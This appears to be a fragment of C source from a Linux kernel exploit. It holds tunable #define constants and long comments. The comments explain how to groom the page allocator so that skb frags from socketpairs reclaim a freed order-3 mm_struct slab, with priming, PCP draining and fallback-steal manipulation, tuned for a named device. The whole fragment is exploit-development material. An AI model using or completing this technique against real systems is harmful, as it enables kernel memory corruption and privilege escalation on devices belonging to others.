...
/* Reclaim budget: sends run round-robin over SKB_RECLAIM_SOCKS socketpairs
 * (~126 frags each before EAGAIN at 8 MiB wmem_max), so the effective
 * budget is SKB_RECLAIM_SENDS * SKB_RECLAIM_SOCKS order-3 frags. The big
 * budget exists because the killed pre/post/spray children leave kernel
 * stacks (order-2) + page tables (order-0/1) that a full PCP drain (see
 * SKB_RECLAIM_FLOOD_SIZE) merges into UNMOVABLE order-3+ buddy blocks; the
 * reclaim must exhaust ALL of that (plus any leftover UNMOVABLE pool and
 * RECLAIMABLE steals the fallback prefers) before __rmqueue_fallback
 * reaches the MOVABLE list where the leak slab sits as the newest order-3
 * block. Garbage size is boot-state dependent (~25-40 MiB observed), so
 * the budget is sized with a large margin: 120 * 24 = 2880 frags = ~95 MiB.
 * The socket count is also what the priming phase (SKB_PRIME_SENDS) reuses,
 * so raising SKB_RECLAIM_SOCKS to 256 gives the priming phase the same
 * 30720-frag coverage (~1 GiB) needed to exhaust RECLAIMABLE steals on a
 * fresh boot. */
#ifndef SKB_RECLAIM_SENDS
#define SKB_RECLAIM_SENDS 120
#endif
#ifndef SKB_RECLAIM_SOCKS
#define SKB_RECLAIM_SOCKS 256
#endif
/* Two-phase reclaim, phase 1 ("priming"): queue order-3 skb frags
 * (round-robin over the same SKB_RECLAIM_SOCKS socketpairs) and then close
 * the socketpairs BEFORE the spray/pre/leak/post mm_struct slabs are
 * allocated. Two effects:
 *  1) Every UNMOVABLE request whose pool is empty does a fallback steal
 *     (whole_block is always allowed for MIGRATE_UNMOVABLE), which
 *     EXHAUSTS the RECLAIMABLE order-3+ blocks the fallback would
 *     otherwise keep stealing during the real reclaim phase. The probe
 *     shows ~82 frags consumed per steal on a fresh boot, so ~370 steals
 *     need ~30000 frags; with only 2880 the reclaim never reached the
 *     MOVABLE list and the walk crashed on the unconverted slab.
 *  2) Blocks that are >= 50% free get converted to UNMOVABLE
 *     (set_pageblock_migratetype), so the freed frag pages sit in the
 *     (order-3, UNMOVABLE) buddy lists and the slab allocations for
 *     spray/pre/leak/post take genuine UNMOVABLE pages. The leak slab
 *     then returns at close(memfd_leak) as the NEWEST (order-3, UNMOVABLE)
 *     block and the phase-2 reclaim frags take it directly (r5-style),
 *     without any fallback at all.
 * Phase 2 is the regular reclaim after close(memfd_leak); it still needs
 * the full budget for the drained child-stack/page-table garbage. */
#ifndef SKB_PRIME_SENDS
#define SKB_PRIME_SENDS 30720
#endif
/* Number of order-3 skb frags queued and HELD (socketpair left open) on a
 * separate socket BEFORE the leak slab is freed. They consume the
 * remaining UNMOVABLE order-3+ free pool, so the reclaim sends after
 * close(memfd_leak) quickly exhaust UNMOVABLE and __rmqueue_fallback
 * reaches the MOVABLE list where the leak slab is the newest order-3
 * block. Without this the sends can keep taking genuine UNMOVABLE pages
 * for the whole send budget and never land on the slab.
 * DISABLED by default: the pool is EMPTY on bluejay (probe slow_first=1),
 * so there is nothing to consume — the only thing between the sends and
 * the MOVABLE fallback is the drained child-stack/page-table garbage,
 * which the multi-socket reclaim budget now exhausts instead. */
#ifndef SKB_RECLAIM_HANDCUFF
#define SKB_RECLAIM_HANDCUFF 0
#endif
/* Drain mechanism (SLIDE_RECLAIM_FLOOD, default ON): free anon order-0
 * pages (munmap of the flood region) to ramp pcp->free_factor >= 1, so
 * every later order-3 free — the pre/post/spray mm-slab discards and
 * close(memfd_leak) — triggers a FULL PCP drain (free_high ->
 * nr_pcp_high()==0). The discards drain the PCP to empty BEFORE the leak
 * close, so the slab is the only page left: its own full drain puts it
 * into the MOVABLE buddy as the NEWEST order-3 block (nothing is freed
 * after it), where the UNMOVABLE frags' fallback steal finds it first.
 * The fire must run before the closes (free_pcppages_bulk processes the
 * slab's own list first; flood leftovers drained after it would be newer
 * and preempt it). */
#ifndef SKB_RECLAIM_FLOOD_SIZE
#define SKB_RECLAIM_FLOOD_SIZE (4096u << 10)
#endif
